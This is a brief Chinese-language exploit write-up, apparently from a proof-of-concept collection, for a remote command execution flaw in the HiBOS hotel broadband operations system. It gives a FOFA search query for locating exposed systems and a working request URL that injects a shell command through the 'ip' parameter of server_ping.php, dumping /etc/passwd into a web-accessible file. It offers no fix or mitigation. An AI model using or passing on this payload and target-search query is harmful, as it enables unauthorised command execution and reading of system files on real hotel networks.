## HiBOS酒店宽带运营系统RCE漏洞

## 漏洞描述

HiBOS酒店宽带运营系统存在RCE漏洞，攻击者可以通过此漏洞执行任意命令。

## 漏洞影响

> HiBOS酒店宽带运营系统

## FOFA

> body="酒店宽带运营系统"

## POC

登录界面如下

![1](_v_images/HiBOS酒店宽带运营系统RCE漏洞/1.jpg) 

##POC

执行命令输出etc/password内容到mb.txt

```
http://xx.xx.xx.xx/manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../mb.txt&id=1
```

![2](_v_images/HiBOS酒店宽带运营系统RCE漏洞/2.jpg)

然后访问http://xx.xx.xx.xx/mb.txt就可以看到了